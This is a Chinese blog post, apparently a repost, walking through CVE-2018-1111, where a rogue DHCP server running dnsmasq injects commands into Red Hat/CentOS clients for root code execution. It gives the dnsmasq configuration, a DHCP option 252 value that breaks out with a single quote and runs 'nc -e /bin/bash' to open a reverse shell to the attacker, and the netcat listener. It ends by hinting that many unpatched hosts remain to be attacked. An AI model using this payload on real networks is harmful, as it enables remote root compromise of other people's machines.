# CVE-2018-1111 劫持 dhcp 造成 Redhat、centos 代码执行 - crazy_py - 博客园

> 原文：[`www.cnblogs.com/liang2580/p/9058227.html`](https://www.cnblogs.com/liang2580/p/9058227.html)

***原文地址：[`www.o2oxy.cn/975.html`](https://www.o2oxy.cn/975.html)***

前言： 看到 crazy 老哥说有一个好新的漏洞。可以在 redhat 和 centos 执行任意代码 、 我说这就很有意思了。晚上来看看

他分享了一下他写的博客。看了下。进入 tools 看了下这个文章，仔细的看了下， 很有意思。有意思

漏洞概述
通过伪造 DHCP 服务器发送响应包，攻击红帽系统，获取 root 权限并执行任意命令。

影响：

测试了一下 centos6 和 centos7 都受到这个影响

利用的整个过程：

宿主机环境：Windows 10 企业版  
虚拟机环境：VMware Workstation

攻击者：Kali linux
受害者：centos7

*   1\. 两台虚拟机的网络适配器都需要设置为 **仅主机模式**
*   2\. 停用主机模式的 DHCP 服务

首先将两个虚拟机设置成仅主机模式，关闭 dhcp 功能。

![](img/fe4f92decfb2877efcc0c779061cf2c3.png)

kali 设置成静态地址，要和下文中的 conf 中的地址相同，网关也是本机 ip。这里我设置成 192.168.71.5

```
root@kali:~# route add default gw 192.168.71.5
```

kali 创建个 dnsmasp.conf 内容如下：

```
bind-interfaces interface=eth0 
except-interface=lo 
dhcp-range=192.168.75.10,192.168.75.20,12h 
dhcp-option=3,192.168.71.5 dhcp-option=6,192.168.71.5
log-queries log-facility=/var/log/dnsmasq.log
```

![](img/37dbf85b90c3e18879b8356fe42c5e12.png)

 开启 dnsmasp：

![](img/4cea5050ef3c65ae6abefcde0b9fbf95.png)

```
dnsmasq -dC dnsmasq.conf --dhcp-option="252,malayke'&nc -e /bin/bash 192.168.71.5 6666 #"
```

![](img/790f48ec73db1fb1d9eecda326b01bd4.png)

nc 侦听 6666 端口

```
nc -l -p 6666 -v
```

![](img/0c684295e6a81c93ee4fa29730c9b6de.png)

kali 这边已经完成了

现在 centos 重启一下网卡！

 ![](img/8ba5e979fe3d9019dfb8d58315bc6181.png)

已经显示获取到了 IP 了 看看 kali 这边的情况吧

 ![](img/9838e4dc1aa15147a8981fe73a9750d3.png)

 写了一个文件。在 centos 里面查看一下

![](img/c53b3e0f02d17e1826a4bf00f571023e.png)

总结：

漏洞原理应该是使用了单引号导致了参数被执行。

```
**--dhcp-option="252,malayke'&nc -e /bin/bash 192.168.182.130 6666 #"**
```

现在应该还有很多主机是没有补丁的。。可以去 …. hhhhhhh